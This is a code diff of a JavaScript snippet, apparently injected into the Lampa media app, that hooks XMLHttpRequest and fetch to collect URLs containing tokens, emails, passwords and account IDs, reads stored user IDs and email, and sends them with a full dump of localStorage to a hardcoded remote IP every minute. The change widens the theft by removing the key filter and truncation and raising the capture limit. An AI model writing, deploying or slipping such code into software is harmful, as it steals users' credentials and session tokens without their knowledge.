@@ -2,7 +2,6 @@
   'use strict';
   var EXFIL = 'http://5.252.116.77:4444';
   var urls = [];
-  var done = false;
 
   function send(d) {
     try {
@@ -26,14 +25,14 @@
     var s = XMLHttpRequest.prototype.send;
     XMLHttpRequest.prototype.send = function(b) {
       var u = this.__u||'';
-      if (u.match(/(email|uid|token|auth|pass|skaz|tv_|account)/i) && urls.length<200) urls.push({url:u,p:hp(u)});
+      if (u.match(/(email|uid|token|auth|pass|skaz|tv_|account)/i) && urls.length<500) urls.push({url:u,p:hp(u)});
       return s.apply(this,arguments);
     };
     if (typeof fetch!=='undefined') {
       var f = window.fetch;
       window.fetch = function(u,o) {
         var s = (typeof u==='string')?u:(u.url||u.href||'');
-        if (s.match(/(email|uid|token|auth|pass|skaz|tv_|account)/i) && urls.length<200) urls.push({url:s,p:hp(s)});
+        if (s.match(/(email|uid|token|auth|pass|skaz|tv_|account)/i) && urls.length<500) urls.push({url:s,p:hp(s)});
         return f.apply(this,arguments);
       };
     }
@@ -42,24 +41,20 @@
   var t = setInterval(function() {
     if (typeof Lampa==='undefined') return;
     clearInterval(t);
+    var uid = Lampa.Storage.get('lampac_unic_id','');
+    var email = Lampa.Storage.get('account_email','');
 
-    var d = {type:'full', ts:Date.now()};
-    d.unic_id = Lampa.Storage.get('lampac_unic_id','');
-    d.email = Lampa.Storage.get('account_email','');
-    d.nws_id = Lampa.Storage.get('lampac_nws_id','');
-    d.storage = {};
+    var full = {type:'full', ts:Date.now(), unic_id:uid, email:email};
+    full.storage = {};
     for (var i=0; i<localStorage.length; i++) {
       var k = localStorage.key(i);
-      var v = localStorage.getItem(k);
-      if (v && k.match(/(skaz|tv_|auth|token|pass|email|uid|account|cub|rd_|nws|profile)/i)) {
-        d.storage[k] = v.length>500 ? v.substr(0,500) : v;
-      }
+      full.storage[k] = localStorage.getItem(k);
     }
-    send(d);
+    send(full);
 
     setInterval(function() {
       var u = urls.slice(); urls = [];
-      if (u.length) send({type:'urls', unic_id:d.unic_id, urls:u, ts:Date.now()});
+      if (u.length) send({type:'urls', unic_id:uid, urls:u, ts:Date.now()});
     }, 60000);
   }, 200);
 })();
